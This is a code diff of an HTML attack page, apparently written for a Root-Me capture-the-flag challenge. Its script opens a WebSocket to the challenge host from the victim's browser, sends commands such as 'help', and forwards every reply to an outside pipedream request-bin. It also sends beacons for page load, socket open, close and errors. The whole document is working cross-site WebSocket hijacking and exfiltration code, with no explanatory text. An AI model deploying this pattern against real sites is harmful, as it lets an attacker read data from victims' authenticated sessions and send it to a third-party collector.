@@ -2,23 +2,14 @@
 <html>
 <body>
 <script>
-fetch("https://eo287p1od7gtso3.m.pipedream.net/?step=page_loaded", { mode: "no-cors" });
+fetch("https://eo287p1od7gtso3.m.pipedream.net/?step=page_loaded_bis", { mode: "no-cors" });
 
-setTimeout(() => {
+try {
   const ws = new WebSocket("ws://ctf20.root-me.org/ws");
 
   ws.onopen = () => {
     fetch("https://eo287p1od7gtso3.m.pipedream.net/?step=ws_open", { mode: "no-cors" });
     ws.send("help");
-    setTimeout(() => ws.send("secret"), 500);
-    setTimeout(() => ws.send("flag"), 1000);
-    setTimeout(() => ws.send("passwd"), 1000);
-  };
-
-  ws.onmessage = (e) => {
-    fetch("https://eo287p1od7gtso3.m.pipedream.net/?msg=" + encodeURIComponent(e.data), {
-      mode: "no-cors"
-    });
   };
 
   ws.onerror = () => {
@@ -28,7 +19,17 @@ setTimeout(() => {
   ws.onclose = () => {
     fetch("https://eo287p1od7gtso3.m.pipedream.net/?step=ws_close", { mode: "no-cors" });
   };
-}, 1500);
+
+  ws.onmessage = (e) => {
+    fetch("https://eo287p1od7gtso3.m.pipedream.net/?msg=" + encodeURIComponent(e.data), {
+      mode: "no-cors"
+    });
+  };
+} catch (e) {
+  fetch("https://eo287p1od7gtso3.m.pipedream.net/?step=ws_ctor_exception", {
+    mode: "no-cors"
+  });
+}
 </script>
 OK
 </body>
